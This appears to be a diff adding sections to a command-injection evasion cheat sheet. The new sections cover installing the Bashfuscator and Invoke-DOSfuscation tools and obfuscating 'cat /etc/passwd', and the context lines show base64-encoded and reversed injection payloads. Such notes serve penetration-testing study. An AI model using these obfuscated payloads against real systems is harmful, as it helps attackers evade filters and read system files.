@@ -26,3 +26,23 @@
 - `POWERSHELL` Reversed Command - `iex "$('imaohw'[-1..-20] -join '')"`
 - Encode the Command using - `echo -n 'cat /etc/passwd | grep 33' | base64` and then use the payload as : `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)`
 
+## Bashfuscator (Linux)
+Installing / Downloading the tool :
+```shell-session
+git clone https://github.com/Bashfuscator/Bashfuscator
+cd Bashfuscator
+pip3 install setuptools==65
+python3 setup.py install --user
+```
+
+To obfuscate the command : `./bashfuscator -c 'cat /etc/passwd'` or `./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1`
+
+## DOSfuscation
+```powershell-session
+git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
+cd Invoke-DOSfuscation
+Import-Module .\Invoke-DOSfuscation.psd1
+Invoke-DOSfuscation
+help
+```
+
